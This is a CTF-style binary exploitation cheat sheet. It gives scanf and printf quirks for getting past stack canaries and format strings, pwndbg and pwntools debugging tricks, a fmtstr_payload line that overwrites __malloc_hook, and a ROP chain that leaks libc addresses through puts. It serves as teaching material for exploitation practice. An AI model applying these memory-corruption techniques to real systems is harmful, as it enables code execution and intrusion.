# printf/scanf tricks
```c
scanf("%d", &n); // passing non number(. or -) yields to keeping the value stored in n
		 // [!] useful for bypassing stack canaries

printf("hello\x00there"); // prints "hello"
			  // printf format string (first arg) terminates on nullbyte
			  // [!] something to keep in mind while exploiting format strings

printf("%100000c"); // triggers malloc
```

# GDB/pwndbg/pwntools tricks
### Pwndbg print whole stack
```
telescope ($rbp-$rsp)/8+1
```
### Running with custom libc without custom linker
If running from pwntools script setting LD_PRELOAD usually works
```python3
gs = '''
c
b *__libc_start_main+391
set $rax = main
<set other breakpoints here>
c
'''

io = gdb.debug(elf.path, gdbscript=gs, env={"LD_PRELOAD" : libc.path})
```
If first method fails you could set rpath to path that holds custom libc with patchelf
```
patchelf --set-rpath `pwd` <binary>
```
If the binary crashes in `__libc_start_main` before `call rax` you can break before the crash and manually set `rax` to the address of main
```
b *__libc_start_main+391
set $rax = main
```
### Tired of writing format string exploits?
Pwntools offers less painful alternative :)
https://docs.pwntools.com/en/stable/fmtstr.html
```python3
fmtstr_payload(8, {__malloc_hook : one_gadget}, write_size="byte")
```

# Leaking libc
This ropchain prints newline and then leaks address of puts from libc. The libc offset is then easily calculated by substracting puts offset from leaked address.
```python3
buf += p64(0x00000000004010a3) 		# pop rdi; ret; 
buf += p64(0x400020) 			# empty line to print -> points to start of .text section
buf += p64(elf.symbols["puts"]) 	# print newline
buf += p64(0x00000000004010a3) 		# pop rdi; ret; 
buf += p64(elf.got["puts"]) 		# rdi = *puts@got
buf += p64(elf.symbols["puts"])
buf += p64(0x000000000040063e) 		# ret; 
buf += p64(elf.symbols["fill"]) 	# call fill() (vulnerable function) for second stage
```
### Not sure which libc version is on remote system?
Leak any libc function from .got table and check with https://libc.blukat.me/

Still not sure?
Leak more libc functions.
### No shellcode, no ropchain? No problem
Use one_gadget https://github.com/david942j/one_gadget
to overwrite whatever address you can control execution with

# More tips
https://ropemporium.com/guide.html

https://github.com/Naetw/CTF-pwn-tips
